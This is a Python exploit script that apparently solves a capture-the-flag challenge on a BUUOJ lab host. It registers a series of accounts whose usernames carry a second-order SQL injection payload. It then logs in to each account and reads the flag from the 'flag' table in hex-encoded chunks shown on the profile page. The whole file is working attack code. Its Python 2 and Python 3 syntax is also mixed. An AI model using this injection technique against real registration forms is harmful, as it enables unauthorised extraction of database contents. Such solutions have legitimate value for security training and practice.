#!/usr/bin/env python2
# -*- coding:utf-8 -*-
import requests
import re,binascii
login_url = "http://302e2e33-d8a5-47ca-aa8e-d4f19785185a.node3.buuoj.cn/login.php"
register_url = "http://302e2e33-d8a5-47ca-aa8e-d4f19785185a.node3.buuoj.cn/register.php"

users_email = ["test0" + str(i) + "@qq.com" for i in range(0,17)]
def register(user_email,offset):
    reg_datas = {
        "email" : user_email,
        "username" : "0'+(select substr(hex(hex((select * from flag))) from " + str(1+offset*10)+ " for 10))+'0",
        "password" : "test"
    }

    # print(reg_datas['username'])
    r = requests.post(url = register_url,data = reg_datas)

def login(user_email):
    login_datas = {
        "email" : user_email,
        "password" : "test"
    }
    r = requests.post(url = login_url,data = login_datas,allow_redirects=True)
    pattern = '<span class=\"user-name\">\s*(\d{1,10})\s*<'
    return re.findall(pattern,r.text)[0]


if __name__ == '__main__':
    flag_double_hex = ''
    for email,offset in zip(users_email,range(0,len(users_email))):
        register(email,offset)
        test = login(email)
        print(test)
        flag_double_hex += test
        print("[-] " + flag_double_hex,end="\r",flush=True)
    print("[+] " + flag_double_hex.decode('hex').decode('hex'))